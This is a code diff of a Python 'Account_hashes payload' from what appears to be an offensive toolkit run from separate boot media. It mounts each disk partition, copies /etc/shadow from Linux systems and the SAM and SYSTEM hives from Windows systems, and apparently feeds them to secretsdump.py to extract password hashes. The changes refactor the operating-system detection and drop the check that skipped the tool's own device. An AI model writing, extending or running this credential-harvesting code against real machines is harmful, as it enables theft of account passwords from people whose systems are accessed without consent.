@@ -11,22 +11,17 @@ SecretsDumpPy = programs.program_wrapper_factory("secretsdump.py")
 
 
 @entry_point.entry_point
-def main() -> None:
-    block_info, _, our_device = storage.setup()
-    common_utils.print_info("Account_hashes payload started")
+def main(block_info: storage.BlocksType, *_) -> None:
     for part in storage.query_all_partitions(block_info):
-        if storage.get_partition_root(part, block_info) == our_device:
-            continue
         with storage.mount_partition(part, PASSPHRASES) as mounted_part:
             part_info = storage.query_partition_info_by_path(part, block_info)
             assert part_info is not None
             part_data = data_dir.wrap_data_path_for_block(part_info)
             # Try to see if we are dealing with any sort of Linux
-            if (mounted_part.exists("usr/sbin/init") or mounted_part.exists("usr/bin/init")) \
-                    and mounted_part.exists("etc/shadow"):
+            if mounted_part.is_linux():
                 # It must be linux or at least it uses shadow, that's all we care about
                 part_data.copy(mounted_part.join("etc/shadow"), "hashes")
-            elif mounted_part.exists("Windows"):
+            elif mounted_part.is_windows():
                 # First, copy the SAM and SYSTEM so if we failed to
                 # extract for whatever reason, not all hope would be lost
                 part_data.copy(mounted_part.join(
@@ -42,6 +37,5 @@ def main() -> None:
             else:
                 common_utils.print_warning("Unknown operating system!")
 
-    common_utils.print_ok("Account_hashes payload completed")
 if __name__ == "__main__":
     main()
